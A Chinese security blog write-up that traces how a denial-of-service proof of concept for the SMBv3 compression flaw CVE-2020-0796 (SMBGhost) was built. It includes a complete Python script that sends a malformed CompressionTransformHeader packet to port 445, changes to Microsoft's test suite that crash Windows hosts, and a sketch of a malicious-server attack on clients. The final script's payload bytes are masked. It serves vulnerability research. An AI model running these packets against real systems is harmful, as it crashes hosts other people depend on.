<meta name="referrer" content="no-referrer"/>
\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.riskivy.com\](https://blog.riskivy.com/%e9%9b%b6%e5%9f%ba%e7%a1%80%e6%8e%a2%e7%b4%a2smbv3%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9epoc/#i-4)

2020.03.11 凌晨左右, 微软泄露一个 SMB 远程代码执行漏洞 (CVE-2020-0796), 根据该漏洞描述是 CompressionTransformHeader 的使用出现了问题。  
2020.03.11 胖虎弟作为一个纯 Web 狗, 只知道 SMB 走 445 端口能开文件共享服务，可是通过简单的搜索发现这个漏洞复现应该很简单，于是尝试写出溢出 POC。

~本文是偏向 Web 狗的视角去描述一次发掘并利用二进制漏洞的过程，给大家图一乐~

2020.03.11 刚拿到这个漏洞信息去 google 了一下（SMB3 deCompression）  
https://www.mail-archive.com/cifs-protocol@lists.samba.org/msg00639.html  
这个链接很有意思  
花了半天时间把邮件看了一下， 收集到如下信息  
1\. 这个洞是 smb 3.1.1 才有  
2\. 可能跟 lz77 压缩算法解密代码有关系  
3\. 问题提出者 Aurélien Aptel 是 这个 SUSE Labs Samba 团队的, 并且把修复后的代码贡献到 wireshark 里面了  
4\. 这个问题在 2019 年 7 月 15 号就提出了  
5\. 影响 `the latest Windows Server 2019` （应该是截止当时 2019.07.15）

![](https://blog.riskivy.com/wp-content/uploads/2020/03/c552a385b04d2205e4313789c3a0ea5b.png)  
先测试这个出了问题的 lz77 解密算法  
\[MS-XCA\]: Processing | Microsoft Docs  
https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-xca/34cb9ab9-5ce6-42d7-a518-107c1c7c65e7

lz77 deCompression 算法的 Python 实现 (根据当时错误的 MS-XCA 伪代码)  
https://ideone.com/7Lr6tN

这里存在一处错误, 缺少对 4-bytes 的校验  
![](https://blog.riskivy.com/wp-content/uploads/2020/03/85b04026d2f7a056ec5682236d9a5e0d.png)

修复后的代码如下

```
#!/usr/bin/env python3
from pprint import pprint as P
import struct


def test(data\_in, data\_out):
    print("==========================")
    print("IN: %s" % data\_in)
    try:
        r = decode(data\_in)
    except:
        print("ERR: exception during decoding")
    else:
        print("FINAL OUT: %s" % r)
        if r == data\_out:
            print("MATCH")
        else:
            print("ERR: decompressed output doesnt match %d %d" % (len(r), len(data\_out)))


def main():
    test(bytes.fromhex(" ff ff ff 1f 61 62 63 17 00 0f ff 26 01"),
         b'abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabc' +
         b'abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabc' +
         b'abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabc' +
         b'abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabc' +
         b'abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabc')

    test(bytes.fromhex('ff ff ff 7f ff 07 00 0f ff 00 00 fc ff 01 00'),
         b'\\xff' \* (1024 \* 128))


def decode(ibuf):
    obuf = bytearray()
    BufferedFlags = 0
    BufferedFlagCount = 0
    InputPosition = 0
    OutputPosition = 0
    LastLengthHalfByte = 0

    def output(x):
        obuf.append(x)
        # print("OUT: %02x"%x)

    while True:
        if BufferedFlagCount == 0:
            # Read 4 bytes at InputPosition
            BufferedFlags = struct.unpack\_from('<I', ibuf, InputPosition)\[0\]
            InputPosition += 4
            BufferedFlagCount = 32
        BufferedFlagCount = BufferedFlagCount - 1
        if (BufferedFlags & (1 << BufferedFlagCount)) == 0:
            # Copy 1 byte from InputPosition to OutputPosition.  Advance both.
            output(ibuf\[InputPosition\])
            InputPosition += 1
            OutputPosition += 1
        else:
            if InputPosition == len(ibuf):
                # Decompression is complete.  Return with success.
                return obuf
            # Read 2 bytes from InputPosition
            MatchBytes = struct.unpack\_from('<H', ibuf, InputPosition)\[0\]
            InputPosition += 2
            MatchLength = MatchBytes % 8
            MatchOffset = (MatchBytes // 8) + 1
            if MatchLength == 7:
                if LastLengthHalfByte == 0:
                    # read 1 byte from InputPosition
                    MatchLength = ibuf\[InputPosition\]
                    MatchLength = MatchLength % 16
                    LastLengthHalfByte = InputPosition
                    InputPosition += 1
                else:
                    # read 1 byte from LastLengthHalfByte position
                    MatchLength = ibuf\[LastLengthHalfByte\]
                    MatchLength = MatchLength / 16
                    LastLengthHalfByte = 0
                if MatchLength == 15:
                    # read 1 byte from InputPosition
                    MatchLength = ibuf\[InputPosition\]
                    InputPosition += 1
                    if MatchLength == 255:
                        # read 2 bytes from InputPosition
                        MatchLength = struct.unpack\_from('<H', ibuf, InputPosition)\[0\]
                        InputPosition += 2
                        if MatchLength == 0:
                            MatchLength = struct.unpack\_from('<H', ibuf, InputPosition)\[0\]
                            InputPosition += 4
                        if MatchLength < 15 + 7:
                            raise Exception("error")
                        MatchLength -= (15 + 7)
                    MatchLength += 15
                MatchLength += 7
            MatchLength += 3
            # print(MatchLength)
            for i in range(int(MatchLength)):  # i = 0 to MatchLength - 1:
                # Copy 1 byte from OutputBuffer\[OutputPosition - MatchOffset\]
                output(obuf\[OutputPosition - MatchOffset\])
                OutputPosition += 1


def encode(symbols):
    Flags = 0
    FlagCount = 0
    FlagOutputPosition = 0
    OutputPosition = 0
    LastLengthHalfByte = 0

    buffer = bytearray()

    def output(x):
        buffer.append(x)
        # print("OUT: %02x"%x)

    for symbol in symbols:
        if isinstance(symbol ,''):
            pass

if \_\_name\_\_ == '\_\_main\_\_':
    main()


```

![](https://blog.riskivy.com/wp-content/uploads/2020/03/5004bea12849c61c5af351d6d630f0e2.png)

这里 `bytes.fromhex('ff ff ff 7f ff 07 00 0f ff 00 00 fc ff 01 00')` 通过 lz77 decode 就可以解码出来 65536 个字节, 我开始一直以为是这里溢出的 (其实不是, 但是这里会跑出异常)

这里就猜测, 是不是可以发送这个包让 smb 服务器解密然后报错退出

按照这个思路, 后面就需要构造 smb 的数据包了, 想了想得去找一个 Python 实现的 smb 客户端 (方便修改操作, tomcat ajp LFI 当时就是这么挖出来的) 和 windows Server 2019 1909 的测试环境

于是就先虚拟机安装了 windows Server 2019 1909

`ed2k://|file|cn_windows_10_consumer_editions_version_1909_updated_jan_2020_x64_dvd_47161f17.iso|5417457664|274FEBA5BF0C874C291674182FA9C851|/`

然后去 github 搜索 smb3 的相关 Python 实现, 找到几个相关的项目  
https://github.com/jborean93/smbprotocol  
https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbconnection.py  
https://github.com/miketeo/pysmb  
https://github.com/vphpersson/smb

然后过滤了一下是否包含 Compression/smb3.1.1 也就剩下

https://github.com/vphpersson/smb  
https://github.com/jborean93/smbprotocol

相对比较有希望, 然后知道继续深入了解到是 COMPRESSION\_TRANSFORM\_HEADER 这个关键字段

https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0#Appendix\_A\_Target\_69

然后继续 github 搜索, 发现一个微软实现的测试集, 这里包含了所有的相关测试

https://github.com/microsoft/WindowsProtocolTestSuites/blob/d78a8339ec98cbd79efb0bd4ec6938440ca3c7a0/ProtoSDK/MS-SMB2/Packets/Smb2CompressedPacket.cs

因为对微软的这套很不熟, 2020.03.11 装了一晚上跑起来了但是也不太会用, 所以继续研究使用 https://github.com/jborean93/smbprotocol

smbprotocol 里面有些地方相对比较清晰, 可以自己操作一些数据, 构建数据包  
比如`smbprotocol/examples/low-level/file-management.py`  
![](https://blog.riskivy.com/wp-content/uploads/2020/03/9c7ff453800a24d1a47a8c2b96fb1eb6.png)

查看 https://github.com/microsoft/WindowsProtocolTestSuites/commit/631824e4f1077d3b73483afb2c425c5883c84c8b

发现微软几天前刚刚更新 lz77 的解密算法, 所以以为这里有漏洞 (虽然后面发现关键漏洞函数不在这里)

![](https://blog.riskivy.com/wp-content/uploads/2020/03/df83462040cf47b213a35219450233ab.png)

后来搜索 lz77 pcap, 碰碰运气, 结果发现 wireshark 已经存在 lz77 的 smb pcap 包提供了, 下载分析

https://github.com/wireshark/wireshark/blob/master/test/captures/smb311-lz77-lz77huff-lznt1.pcap.gz

![](https://blog.riskivy.com/wp-content/uploads/2020/03/1aad1380ecea87fde6fce1b9e910c240.png)

然后根据 smbprotocol.connection.Connection.connect 中的相关代码, 以及 smbprotocol.connection.SMB2TransformHeader

`SMB2TransformHeader`

```
class SMB2TransformHeader(Structure):
    """
    \[MS-SMB2\] v53.0 2017-09-15

    2.2.41 SMB2 TRANSFORM\_HEADER
    The SMB2 Transform Header is used by the client or server when sending
    encrypted message. This is only valid for the SMB.x dialect family.
    """

    def \_\_init\_\_(self):
        self.fields = OrderedDict(\[
            ('protocol\_id', BytesField(
                size=4,
                default=b"\\xfdSMB"
            )),
            ('signature', BytesField(
                size=16,
                default=b"\\x00" \* 16
            )),
            ('nonce', BytesField(size=16)),
            ('original\_message\_size', IntField(size=4)),
            ('reserved', IntField(size=2, default=0)),
            ('flags', IntField(
                size=2,
                default=1
            )),
            ('session\_id', IntField(size=8)),
            ('data', BytesField())  # not in spec
        \])
        super(SMB2TransformHeader, self).\_\_init\_\_()


```

参考文档  
https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0

可以尝试构造 SMB2CompressionTransformHeader

`SMB2CompressionTransformHeader`

```
class SMB2CompressionTransformHeader(Structure):
    def \_\_init\_\_(self):
        self.fields = OrderedDict(\[
            ('protocol\_id', BytesField(
                size=4,
                default=b"\\xfcSMB"
            )),
            ('OriginalCompressedSegmentSize', IntField(
                size=4,
                default=0x00
            )),
            ('CompressionAlgorithm', IntField(
                size=2,
                default=0x0002
            )),
            ('Flags', IntField(
                size=2,
                default=0x0000 #其实漏洞点在这里
            )),
            ('Length', IntField(
                size=4,
                default=0x00
            )),

        \])
        super(SMB2CompressionTransformHeader, self).\_\_init\_\_()


```

可以构造出来一个符合 smbv3.1.1 CompressionTransformHeader 的包

```
import uuid
from collections import OrderedDict
import socket

from smbprotocol import Commands

from smbprotocol.connection import \*

from smbprotocol.structure import BytesField, IntField, Structure
#!/usr/bin/env python3
from pprint import pprint as P
import struct


def decode(ibuf):
    obuf = bytearray()
    BufferedFlags = 0
    BufferedFlagCount = 0
    InputPosition = 0
    OutputPosition = 0
    LastLengthHalfByte = 0

    def output(x):
        obuf.append(x)
        # print("OUT: %02x"%x)

    while True:
        if BufferedFlagCount == 0:
            # Read 4 bytes at InputPosition
            BufferedFlags = struct.unpack\_from('<I', ibuf, InputPosition)\[0\]
            InputPosition += 4
            BufferedFlagCount = 32
        BufferedFlagCount = BufferedFlagCount - 1
        if (BufferedFlags & (1 << BufferedFlagCount)) == 0:
            # Copy 1 byte from InputPosition to OutputPosition.  Advance both.
            output(ibuf\[InputPosition\])
            InputPosition += 1
            OutputPosition += 1
        else:
            if InputPosition == len(ibuf):
                # Decompression is complete.  Return with success.
                return obuf
            # Read 2 bytes from InputPosition
            MatchBytes = struct.unpack\_from('<H', ibuf, InputPosition)\[0\]
            InputPosition += 2
            MatchLength = MatchBytes % 8
            MatchOffset = (MatchBytes // 8) + 1
            if MatchLength == 7:
                if LastLengthHalfByte == 0:
                    # read 1 byte from InputPosition
                    MatchLength = ibuf\[InputPosition\]
                    MatchLength = MatchLength % 16
                    LastLengthHalfByte = InputPosition
                    InputPosition += 1
                else:
                    # read 1 byte from LastLengthHalfByte position
                    MatchLength = ibuf\[LastLengthHalfByte\]
                    MatchLength = MatchLength / 16
                    LastLengthHalfByte = 0
                if MatchLength == 15:
                    # read 1 byte from InputPosition
                    MatchLength = ibuf\[InputPosition\]
                    InputPosition += 1
                    if MatchLength == 255:
                        # read 2 bytes from InputPosition
                        MatchLength = struct.unpack\_from('<H', ibuf, InputPosition)\[0\]
                        InputPosition += 2
                        if MatchLength == 0:
                            MatchLength = struct.unpack\_from('<H', ibuf, InputPosition)\[0\]
                            InputPosition += 4
                        if MatchLength < 15 + 7:
                            raise Exception("error")
                        MatchLength -= (15 + 7)
                    MatchLength += 15
                MatchLength += 7
            MatchLength += 3
            # print(MatchLength)
            for i in range(int(MatchLength)):  # i = 0 to MatchLength - 1:
                # Copy 1 byte from OutputBuffer\[OutputPosition - MatchOffset\]
                output(obuf\[OutputPosition - MatchOffset\])
                OutputPosition += 1


class SMB2CompressionTransformHeader(Structure):
    def \_\_init\_\_(self):
        self.fields = OrderedDict(\[
            ('protocol\_id', BytesField(
                size=4,
                default=b"\\xfcSMB"
            )),
            ('OriginalCompressedSegmentSize', IntField(
                size=4,
                default=0x00
            )),
            ('CompressionAlgorithm', IntField(
                size=2,
                default=0x0002
            )),
            ('Flags', IntField(
                size=2,
                default=0x0000
            )),
            ('Length', IntField(
                size=4,
                default=0x00
            )),

        \])
        super(SMB2CompressionTransformHeader, self).\_\_init\_\_()


# 这里填充的是从wireshark里面抠出来已经lz77编码过的数据
header\_actual = b'\\xb0\\x82\\x88\\x00\\xfe\\x53\\x4d\\x42\\x40\\x00\\x01\\x00\\x01\\x00\\x08\\x00\\x0a\\x4c\\x00\\x00\\x00\\x06\\x8a\\x00\\x00\\x00\\xff\\xfe\\x00\\x9a\\x00\\x6d\\x79\\x00\\x10\\xa4\\x00\\x37\\x00\\x11\\x11\\x00\\x50\\x00\\xff\\xff\\xff\\x5f\\x00\\xbf\\x00\\x61\\x07\\x00\\x0f\\xff\\xfc\\x0f'
print(header\_actual)
print(len(header\_actual))
print("--"\*20)

message = SMB2CompressionTransformHeader()
message\['OriginalCompressedSegmentSize'\] = len(decode(header\_actual))
message\['Length'\] = 0xffffffff
actual = message.pack()
print(message)
msg\_body\_len = len(actual + header\_actual)
print(msg\_body\_len)
L = bytes.fromhex(hex(msg\_body\_len)\[2:\])
print(L)
nbss = b'\\x00' + b'\\x00' \* (3-len(L)) + L
print(nbss)

smb\_payload = nbss + actual + header\_actual
s = socket.socket(2, 1)
s.connect(("192.168.38.136", 445))
s.send(smb\_payload)
buff\_res = s.recv(4096)
print(buff\_res)
s.close()


```

![](https://blog.riskivy.com/wp-content/uploads/2020/03/e6905e15eda7da3efea60ec158cb7547.png)

2020.03.12 日夜间微软发布了对应的补丁, 2020.03.13 凌晨陆续纰漏相关补丁对比细节

https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html

这里提到我之前发现的 微软 Windows 协议测试包

https://github.com/microsoft/WindowsProtocolTestSuites/blob/d78a8339ec98cbd79efb0bd4ec6938440ca3c7a0/ProtoSDK/MS-SMB2/Packets/Smb2CompressedPacket.cs

![](https://blog.riskivy.com/wp-content/uploads/2020/03/d0724e97ee2eec629581f5fd83162563.png)

到这里我已经看了 1,2 天的 smb 协议了, 大概知道是怎么回事了, 我大方向是还是对的

这里修改 `Smb2Compression` 中的 `compressedPacket.Header.Offset` 为 `0xffffffff` 即可, 然后本地再次启动 `WindowsProtocolTestSuites`

安装依赖可以使用 `WindowsProtocolTestSuites\InstallPrerequisites\InstallPrerequisites.ps1`

![](https://blog.riskivy.com/wp-content/uploads/2020/03/0e05ec709dce3fa6502ac04361a86f68.png)

这里会帮你安装 vs2017 或者 vs2019

启动项目, 选择  
`\WindowsProtocolTestSuites`

然后在`解决方案管理器`中点击

`\WindowsProtocolTestSuites\TestSuites\FileServer\src\FileServer.sln`

调出`测试资源管理器`, 得到如下界面  
![](https://blog.riskivy.com/wp-content/uploads/2020/03/6d51561b344374081b7a8f3fb28ee59c.png)

如果运行报错可以把如下代码注释掉, 这是个检测系统版本的判断条件, 对测试没有影响

```
// Check platform
/\* if (TestConfig.IsWindowsPlatform)
{
BaseTestSite.Assume.IsFalse(TestConfig.Platform < Platform.WindowsServerV1903, "Windows 10 v1809 operating system and prior, Windows Server v1809 operating system and prior, and Windows Server 2019 and prior do not support compression.");
}\*/


```

另外还需要修改一处测试 config 文件 (可以搜索 `192.168.1.11`查找)

`\WindowsProtocolTestSuites\TestSuites\FileServer\src\Common\TestSuite\CommonTestSuite.deployment.ptfconfig`

这是本次测试的配置文件, 修改对应的选线为目标靶机即可, 密码最好填正确的, 比较方便抓包测试 (有些测试步骤需要认证, 方便 wireshark 抓包), 其实不需要密码

![](https://blog.riskivy.com/wp-content/uploads/2020/03/7c76f6d43a6f0a64d2463f42af676931.png)

然后修改`\WindowsProtocolTestSuites\ProtoSDK\MS-SMB2\Common\Smb2Compression.cs` 中的`compressedPacket.Header.Offset = 0xffffffff;`

![](https://blog.riskivy.com/wp-content/uploads/2020/03/995b4f591b1a94036764a96439142bfa.png)

找到 `Microsoft.Protocols.TestSuites.FileSharing.SMB2.TestSuite.Compression.BVT_SMB2Compression_LZ77` 运行测试

这里打开 wireshark 抓包, 若是虚拟机是 nat 模式的话, 选择抓`vnet8`网卡  
![](https://blog.riskivy.com/wp-content/uploads/2020/03/338eb9deed0a03193d3136965ee37e4a.png)

这里一共 2 个请求包一个响应包, 此时 win10 测试靶机已经蓝屏  
![](https://blog.riskivy.com/wp-content/uploads/2020/03/6e9617e9c88ee6477e14a43b2ea7d2ac.png)

![](https://blog.riskivy.com/wp-content/uploads/2020/03/c9c813c3689b1a3d832b0469a22674ea.png)

因为这里微软测试包发包时使用了 smb 签名, 所以不能重放, 所以按照 smb2 通信图猜测, 只需要一个协商包一个压缩包即可实现 dos

![](https://blog.riskivy.com/wp-content/uploads/2020/03/04bf4184cdb520d9217518b4e72fd914.png)

这里协商包从 https://github.com/ollypwn/SMBGhost 扣了出来, 因为这里的 smb 协商包没有签名, 然后我修改了加密算法为 lz77

然后追加一个 lz77 的压缩包

(这里 POC 仅能导致蓝屏, 没有其他攻击作用, 不要来检测漏洞)

```
\# CVE-2020-0796 DOS EXP
import socket
s = socket.socket(2, 1)
s.connect(("192.168.38.136", 445))
print("send Negotiate.....")
smb\_payload\_1 = b'相关原因马赛克'
s.send(smb\_payload\_1)
buff\_res = s.recv(4096)
print("send Payload.....")
smb\_payload = b"相关原因马赛克"
s.send(smb\_payload)
buff\_res = s.recv(4096)
s.close()


```

大概逻辑是客户端先发送一个 Negotiate 包跟 Smb server 商议使用 lz77 加密传输后续消息 (加密方式可能无关, 但是这个比较好实现)

然后 再发送一个修改了 offset 的使用了 CompressionTransformHeader 的数据包

触发 smb server 中的整形溢出漏洞, 然后 Win10 测试靶机崩溃蓝屏

![](https://blog.riskivy.com/wp-content/uploads/2020/03/ee223e0602b661d9d3828e6cfb12ad57.png)

同样的原理, 诱导客户端访问 UNC 格式路径也可以触发这个漏洞  
这里构造一个恶意服务器, 等待客户端连接, 响应一个 Negotiate 包跟 Smb clinet 商议使用加密传输, 然后接收客户端下一个请求, 再返回一个恶意的压缩包就 ok, 视频如下  

[CVE-2020-0796\_dos\_exp](https://blog.riskivy.com/wp-content/uploads/2020/03/CVE-2020-0796_dos_exp.7z)

检测 POC pcap  
https://github.com/ollypwn/SMBGhost/blob/master/SMBGhost.pcap

NEGOTIATE\_CONTEXT 参考这里  
https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb2/15332256-522e-4a53-8cd7-0bd17678a2f7  
![](https://blog.riskivy.com/wp-content/uploads/2020/03/aa13f22f09bfd5a0bc032e252f4888d7.png)

可以看到协商请求包中 NEGOTIATE\_CONTEXT 有 2 个, 所以 NegotiateContextCount 为 2

![](https://blog.riskivy.com/wp-content/uploads/2020/03/fcfe06c218baac80431dd69bef3a26b6.png)

CAPABILITIES 分别为`SMB2_PREAUTH_INTEGRITY_CAPABILITIES` 和 `SMB2_COMPRESSION_CAPABILITIES`

![](https://blog.riskivy.com/wp-content/uploads/2020/03/589ded7f1ea1ec3245213cc8c710101e.png)

如果服务器支持, 就会所以返回 NEGOTIATE\_CONTEXT 为 2, 所以 POC 检测协商返回包中的 NegotiateContextCount 是否为 2, 如果为 2 且 smb 支持 3.1.1 方言就认为目标有漏洞

但这里有个问题, 如果目标打了 smb 补丁, 这里还会返回 NegotiateContextCount 为 2, 所以目前的版本检测 POC 在目标打补丁后会有误报

![](https://blog.riskivy.com/wp-content/uploads/2020/03/994420c164fd66616e8279a9f7692e67.png)

作者：斗象能力中心 TCC – 小胖虎